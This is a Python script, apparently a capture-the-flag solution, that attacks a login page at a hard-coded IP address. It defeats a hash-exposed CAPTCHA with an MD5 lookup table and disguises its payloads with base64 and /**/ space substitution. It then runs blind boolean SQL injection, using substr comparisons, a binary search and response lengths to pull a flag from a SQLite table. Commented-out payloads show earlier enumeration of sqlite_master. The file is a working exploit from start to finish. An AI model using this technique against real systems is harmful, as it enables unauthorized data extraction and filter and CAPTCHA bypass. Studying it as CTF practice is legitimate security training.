import requests
import hashlib
import base64
import string

URL = "http://20.195.43.216:8031/login"
TRUE_LENGTH = 1671
CHARSET = sorted(string.printable)

md5_lookup = {hashlib.md5(str(i).encode()).hexdigest(): str(i) for i in range(1000, 10000)}

s = requests.Session()

def get_captcha():
    resp = s.get(URL)
    captcha_hash = resp.headers.get("X-CapCapiCap", "")
    return md5_lookup.get(captcha_hash, "0000")

def extract_char(pos):
    low, high = 0, len(CHARSET) - 1
    while low <= high:
        mid = (low + high) // 2
        char = CHARSET[mid]

        captcha = get_captcha()

        # payload = f"' OR substr((SELECT tbl_name FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1,1),{pos},1)>'{char}' --"
        #  --= fl4gz_1s_h3re
        # payload = f"' OR substr((SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='fl4gz_1s_h3re'),{pos},1)>'{char}' --"
        #  --= CREATE TABLE fl4gz_1s_h3re 'fl4gz text not null'
        payload = f"' OR substr((SELECT fl4gz FROM fl4gz_1s_h3re),{pos},1)>'{char}' --"
        data = {
            "username": base64.b64encode(payload.replace(" ", "/**/").encode()).decode(),
            "password": base64.b64encode(b"bebas").decode(),
            "captcha": captcha,
        }
        resp = s.post(URL, data=data)

        if len(resp.text) == TRUE_LENGTH:
            low = mid + 1 
        else:
            high = mid - 1

    return CHARSET[low] if low < len(CHARSET) else ""

password = ""
pos = 1
while True:
    char = extract_char(pos)
    if not char: break
    password += char
    print(f"Flag: {password}")
    if char == '}': exit(1)
    pos += 1